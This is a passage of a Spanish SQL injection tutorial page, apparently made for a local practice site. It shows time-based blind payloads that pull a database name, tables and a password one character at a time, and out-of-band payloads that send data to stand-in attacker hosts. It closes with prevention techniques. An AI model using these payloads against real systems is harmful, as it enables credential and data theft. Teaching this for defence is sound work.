+<div class="sect4">
+<h5 id="_reconocimiento_4">Reconocimiento</h5>
+<div class="paragraph">
+<p>En este tipo de ataques, notaremos que si es verdadero la página empezará a cargar, si es falso la página se actualizará con normalidad.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(1=1, SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Recon1.png" alt="Reconocimiento1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Recon2.png" alt="Reconocimiento2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(1=2, SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Recon3.png" alt="Reconocimiento3">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Recon4.png" alt="Reconocimiento4">
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>AND IF(1=1, SLEEP(5), 0)</strong> &#8594; Si la condición 1=1 es verdadera (siempre lo es), el servidor ejecutará SLEEP(5) y causará un retraso de 5 segundos.</p>
+</li>
+</ul>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_payloads_4">Payloads</h5>
+<div class="paragraph">
+<p><strong>Obtener el nombre de la base de datos completo</strong></p>
+</div>
+<div class="paragraph">
+<p>Como ya sabemos que es <strong>banco</strong> podemos buscar directamente, pero ocurre como en el anterior ataque.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(SUBSTRING(DATABASE(),1,1) = 'b', SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/BaseDatos1.png" alt="BaseDatos1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/BaseDatos2.png" alt="BaseDatos2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>admin' AND IF(SUBSTRING(DATABASE(),1,1) = 'b', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING(DATABASE(),2,1) = 'a', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING(DATABASE(),3,1) = 'n', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING(DATABASE(),4,1) = 'c', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING(DATABASE(),5,1) = 'o', SLEEP(5), 0) --</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>IF(SUBSTRING(DATABASE(),1,1) = 'a', SLEEP(5), 0)</strong> &#8594; Si el primer carácter es 'a', el servidor esperará 5 segundos (esto es el ataque Time-Based).</p>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>SUBSTRING(DATABASE(),1,1)</strong> &#8594; Extrae el primer carácter del nombre de la base de datos.</p>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p><strong>DATABASE()</strong> Función de MySQL que devuelve el nombre de la base de datos actual.</p>
+</li>
+</ol>
+</div>
+</li>
+</ul>
+</div>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p><strong>Obtener tablas sobre la base de datos</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso vamos a buscar la tabla <strong>usuarios</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),1,1) = 'u', SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Tablas1.png" alt="Tablas1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Tablas2.png" alt="Tablas2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),1,1) = 'u', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),2,1) = 's', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),3,1) = 'u', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),4,1) = 'a', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),5,1) = 'r', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),6,1) = 'i', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),7,1) = 'o', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),8,1) = 's', SLEEP(5), 0) --</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()</strong> &#8594; Consulta que selecciona las tablas de la base de datos actual.</p>
+</li>
+<li>
+<p><strong>SUBSTRING(&#8230;&#8203;)</strong> &#8594; Extrae el primer carácter del nombre de la primera tabla.</p>
+</li>
+<li>
+<p><strong>SLEEP(5)</strong> &#8594; Si el primer carácter es correcto (en este caso, 'u'), el servidor hará una pausa de 5 segundos.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p><strong>Obtener las columnas de una tabla</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso vamos a buscar la columna <strong>id</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'usuarios' LIMIT 1),1,1) = 'i', SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Columnas1.png" alt="Columnas1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Columnas2.png" alt="Columnas2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>admin' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'usuarios' LIMIT 1),1,1) = 'i', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'usuarios' LIMIT 1),2,1) = 'd', SLEEP(5), 0) --</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>SELECT column_name FROM information_schema.columns WHERE table_name = 'usuarios'</strong> &#8594; Consulta que selecciona los nombres de las columnas de la tabla 'usuarios'.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p><strong>Obtener contraseñas o datos sensibles</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso vamos a buscar la contraseña <strong>admin123</strong> dentro de los columna <strong>password</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),1,1) = 'a', SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Contraseña1.png" alt="Contraseña1">
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/blind/time/Contraseña2.png" alt="Contraseña2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),1,1) = 'a', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),2,1) = 'd', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),3,1) = 'm', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),4,1) = 'i', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),5,1) = 'n', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),6,1) = '1', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),7,1) = '2', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),8,1) = '3', SLEEP(5), 0) --</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>SELECT password FROM usuarios LIMIT 1: Obtiene la primera fila de la columna password de la tabla usuarios.</p>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_aclaración_2">Aclaración</h5>
+<div class="paragraph">
+<p>Como hemos podido ver, ocurre como en el caso anterior aunque cambia un poco la sintaxis, por ello recomiendo el uso de scripts en los ataques a ciegas.</p>
+</div>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_3_out_of_band_sql_injection_oob_sqli_2">3. Out-of-band SQL injection (OOB SQLi)</h3>
+<div class="paragraph">
+<p>Los ataques fuera de banda se basan en enviar la información al servidor http o dns del atacante. En nuestro caso, no podemos realizarlos ya que la base de datos debe hacer peticiones externas y al estar en local no se puede, de todas formas, vamos a ver cómo se realizan estos ataques.</p>
+</div>
+<div class="paragraph">
+<p>Hay que entender que estos ataques se realizan cuando el atacante no puede usar el mismo canal para enviar el ataque y recibir los datos o cuando el servidor responde que es inestable. Normalmente se realiza por HTTP. Y es importante que el servidor no tenga --secure-file-priv, ya que limita la lectura o escritura de atchivos a un directorio específico.</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>El atacante realiza una consulta a la web con un payload como los siguientes:</p>
+</li>
+</ul>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>- HTTP: ' UNION SELECT NULL,NULL,(...),CONCAT('http://example.com/?data=', @@version) ;--
+
+Este payload realiza una inyección SQL y ejecuta una consulta que solicita un archivo en el servidor del atacante. En este caso, la consulta le pide al servidor web de la víctima que realice una petición HTTP a un servidor controlado por el atacante y pase información (en este caso, la versión de MySQL) como parte de la URL.
+
+- DNS: ' UNION SELECT NULL,NULL,(...),@@version INTO OUTFILE '\\\\example.com\\capture.txt' ;--
+
+Similar al anterior, pero en este caso, la inyección SQL hace que la base de datos intente resolver un dominio DNS. La función load_file() o una función similar intenta acceder a un recurso en el dominio controlado por el atacante. Esto puede ser aprovechado para exfiltrar información como la versión de MySQL o el nombre de usuario.</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>La página web realiza la consulta a la base de datos, pasando el payload del atacante en la consulta SQL.</p>
+</li>
+<li>
+<p>Cómo recibe el atacante la información:</p>
+</li>
+</ul>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>- HTTP: La base de datos realiza una petición HTTP al servidor del atacante. En este caso, el payload contiene una URL que será solicitada al servidor del atacante, permitiendo que los datos (por ejemplo, la versión de la base de datos) sean enviados como parte de los parámetros de la URL.
+
+Por ejemplo, la base de datos de la víctima hará una solicitud HTTP similar a: http://attacker.com/capture?version=5.7.35
+
+- DNS: El servidor de bases de datos realiza una consulta DNS al dominio controlado por el atacante. El atacante puede ver las consultas DNS que se envían al servidor controlado por él, y en esos registros de DNS podrá ver los datos exfiltrados, como la versión de MySQL o cualquier otra información solicitada en la consulta SQL.
+
+En este caso, el servidor de la base de datos realiza una consulta a un dominio DNS como: 5.7.35.attacker.com
+
+El atacante puede ver esta consulta en su servidor DNS y extraer la información.</pre>
+</div>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/oob/OOB.png" alt="OOB">
+</div>
+</div>
+<div style="page-break-after: always;"></div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_cómo_prevenir">¿Cómo prevenir?</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="_1_parametrizar">1. Parametrizar</h3>
+<div class="paragraph">
+<p>Las consultas parametrizadas (prepared statements) con variables asociadas (variable binding), son la forma correcta para escribir sentencias SQL. Para ello se define primero todo el código SQL y después se asocia cada parámetro variable. Este tipo de construcción permite a la base de datos distinguir entre código (estructura) y datos (valores) sin importar qué entradas proporcionó un usuario.</p>
+</div>
+<div class="paragraph">
+<p>Nuestra página está escrita con PHP usando solo una consulta sin preparar. Podemos observar en el siguiente ejemplo cómo sería una consulta preparada en PHP:</p>
+</div>
+<details>
+<summary class="title">Consulta preparada</summary>
+<div class="content">
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+$sentencia = $mbd-&gt;prepare("INSERT INTO REGISTRY (name, value) VALUES (:name, :value)");
+$sentencia-&gt;bindParam(':name', $nombre);
+$sentencia-&gt;bindParam(':value', $valor);
+
+// insertar una fila
+$nombre = 'uno';
+$valor = 1;
+$sentencia-&gt;execute();
+
+// insertar otra fila con diferentes valores
+$nombre = 'dos';
+$valor = 2;
+$sentencia-&gt;execute();
+?&gt;</code></pre>
+</div>
+</div>
+</div>
+</details>
+</div>
+<div class="sect2">
+<h3 id="_2_procedimientos_almacenados">2. Procedimientos almacenados</h3>
+<div class="paragraph">
+<p>Los procedimientos almacenados (stored procedures) pueden ayudar a limitar el riesgo asociado a la inyección de código SQL. Estos son código guardado en la base de datos que pueden verse como funciones reutilizables y de acceso rápido por el motor de base de datos. Los procedimientos almacenados también pueden comprobar el tipo de los parámetros de entrada, impidiendo que se introduzcan datos que incumplan el tipo que el campo está diseñado para recibir.</p>
+</div>
+<div class="paragraph">
+<p>Sin embargo, si fueron programados de forma insegura con ejecución dinámica de SQL el problema seguirá allí. Podemos ver un ejemplo de esto:</p>
+</div>
+<details>
+<summary class="title">Procedimiento almacenado vulnerable</summary>
+<div class="content">
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-sql" data-lang="sql">CREATE PROCEDURE sp_getProductByCategory
+    @category VARCHAR(50)
+AS
+BEGIN
+    SET NOCOUNT ON;
+
+    DECLARE @query NVARCHAR(MAX);
+    SET @query = 'SELECT * FROM products WHERE category = ''' + @category + ''' AND released = 1';
+    EXECUTE sp_executesql @query;
+END</code></pre>
+</div>
+</div>
+</div>
+</details>
+<div class="paragraph">
+<p>Al crear una consulta internamente con un valor dinámico que afecta a la estructura, la situación es la misma que invocando SQL por programación. El procedimiento almacenado podría verse así con el parámetro como valor y no como parte de la estructura de la sentencia:</p>
+</div>
+<details>
+<summary class="title">Procedimiento almacenado</summary>
+<div class="content">
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-sql" data-lang="sql">CREATE PROCEDURE sp_getProductByCategory
+    @category VARCHAR(50)
+AS
+BEGIN
+    SET NOCOUNT ON;
+
+    SELECT * FROM products WHERE category = @category AND released = 1;
+END</code></pre>
+</div>
+</div>
+</div>
+</details>
+</div>
+<div class="sect2">
+<h3 id="_3_validación_contra_valores_permitidos">3. Validación contra valores permitidos</h3>
+<div class="paragraph">
+<p>Se usa cuando no se puede usar directamente una consulta parametrizada para protegernos contra inyecciones SQL. Esto pasa en ciertos casos donde el valor que viene del usuario no puede ir como parámetro, porque no es un dato como un número o texto, sino que se trata de partes estructurales de la consulta SQL. Por ejemplo, con el nombre de una tabla o columna, o si el orden en una cláusula ORDER BY será ascendente (ASC) o descendente (DESC). En esta situación la defensa más apropiada es validar las entradas de usuario y/o rediseño de la sentencia SQL.</p>
+</div>
+<div class="paragraph">
+<p>No se debe permitir que el usuario escriba directamente un nombre de tabla o columna que se inserte tal cual en la consulta SQL, porque eso es muy peligroso. Un ejemplo de cómo validar sería usando un switch, como este ejemplo en PHP:</p>
+</div>
+<details>
+<summary class="title">White List</summary>
+<div class="content">
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+$unsafeUserParameter = $_GET['table'] ?? '';
+
+$tableName = '';
+
+// Validamos con una lista de opciones válidas
+switch ($unsafeUserParameter) {
+    case 'clients':
+        $tableName = 'table_clients';
+        break;
+    case 'sellers':
+        $tableName = 'table_sellers';
+        break;
+    ...
+    default:
+        throw new Exception("Valor inesperado proporcionado para el nombre de la tabla.");
+&gt;?
+}
+
+$query = "SELECT * FROM $tableName";</code></pre>
+</div>
+</div>
+</div>
+</details>
+<div class="ulist">
+<ul>
+<li>
+<p>Si el usuario manda el valor "clients", lo convierte a "table_clients".</p>
+</li>
+<li>
+<p>Si manda "sellers", lo convierte a "table_sellers".</p>
+</li>
+<li>
+<p>Si manda cualquier otro valor, lanzas un error.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>De esta forma se asegura de que el nombre que se usa en la consulta sea uno de los que se controlan y no algo malicioso.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_4_escapar_todas_las_entradas_de_usuario">4. Escapar todas las entradas de usuario</h3>
+<div class="paragraph">
+<p>Esta es una forma de protegerse contra inyecciones SQL, pero no es la más recomendada. De hecho, solo se debe usar si no se puede aplicar otras defensas mejores, como las consultas parametrizadas o la validación contra valores permitidos.</p>
+</div>
+<div class="paragraph">
+<p>Escapar significa modificar (o transformar) los datos que vienen del usuario para que no puedan romper la consulta SQL ni ejecutar código malicioso. Por ejemplo, si un usuario escribe <strong>' OR 1=1 --</strong>, al escapar esa entrada, la comilla <strong>'</strong> y otros caracteres peligrosos se transforman en versiones seguras que se interpretan como texto normal y no como parte del código SQL.</p>
+</div>
+<div class="paragraph">
+<p>Esto se puede realizar con bibliotecas en el caso de java. En el caso de Mysql, podemos ver lo siguiente:</p>
+</div>
+<div class="paragraph">
+<p>Existen dos modos específicos para realizar esto en Mysql:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p><strong>ANSI_QUOTES SQL</strong>: Escapar todos los caracteres <strong>'</strong>, con <strong>''</strong>.</p>
+</li>
+<li>
+<p><strong>MySQL Mode</strong> que hace lo siguiente:</p>
+</li>
+</ol>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>NUL (0x00) --&gt; \0
+BS  (0x08) --&gt; \b
+TAB (0x09) --&gt; \t
+LF  (0x0a) --&gt; \n
+CR  (0x0d) --&gt; \r
+SUB (0x1a) --&gt; \Z
+"   (0x22) --&gt; \"
+%   (0x25) --&gt; \%
+'   (0x27) --&gt; \'
+\   (0x5c) --&gt; \\
+_   (0x5f) --&gt; \_
+
+todos los demás caracteres no alfanuméricos con valores ASCII
+inferior a 256 --&gt; \c donde 'c' es el carácter no alfanumérico original.</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Otra forma de hacerlo más seguro es convertir el texto del usuario a hexadecimal. Si un atacante intentara inyectar con la típica comilla simple ' y un espacio, el SQL final se vería:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-sql" data-lang="sql">SELECT * FROM products WHERE hex_encode(category) = '2720...'</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>27 es el código ASCII (en hexadecimal) de la comilla simple y 20 el del espacio en blanco. Como la transformación solo genera dígitos numéricos y letras de la A a la F, ningún caracter especial puede causar la inyección.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_5_aplicar_el_mínimo_privilegio">5. Aplicar el mínimo privilegio:</h3>
+<div class="paragraph">
+<p>El principio de menor privilegio consiste en otorgar a la cuenta de base de datos utilizada por una aplicación solo los permisos estrictamente necesarios para su funcionamiento, evitando el uso de cuentas con privilegios elevados como administrador. Esto reduce el impacto de un posible ataque de inyección SQL, ya que limita lo que un atacante podría hacer si lograra explotar la vulnerabilidad.</p>
+</div>
+<div class="paragraph">
+<p>Por ejemplo, si la app solo necesita leer datos, se deben otorgar solo permisos de lectura, evitando accesos innecesarios como modificación de tablas o ejecución de comandos críticos. También se recomienda no ejecutar el servicio de base de datos con permisos elevados en el sistema operativo.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_6_web_application_firewall_waf">6. Web Application Firewall (WAF)</h3>
+<div class="paragraph">
+<p>Cómo ya hemos visto en anteriores pecados vuelve a aparecer el WAF, ya que es una herramienta de seguridad que filtra, monitorea y bloquea tráfico HTTP identificado como malicioso que viaja hacia una aplicación que se intenta proteger. Obviamente, no hay que confiarse y apostar solo por esto, ya que los problemas raíz de la aplicación no se solucionan con un WAF y continuamente se hacen públicas técnicas de bypass para WAF de distintas tecnologías y proveedores.</p>
+</div>
+<div class="paragraph">
+<p>Esto es solo una herramienta complementaria &#8594; <a href="https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF">SQL Injection Bypassing WAF</a>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>"Si piensas que la tecnología puede resolver tus problemas de seguridad, entonces no entiendes los problemas ni entiendes la tecnología."
+
+— Bruce Schneier</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="footer">
+<div id="footer-text">
+Last updated 2025-04-13 16:40:26 UTC
+</div>
+</div>
+</body>
+</html>
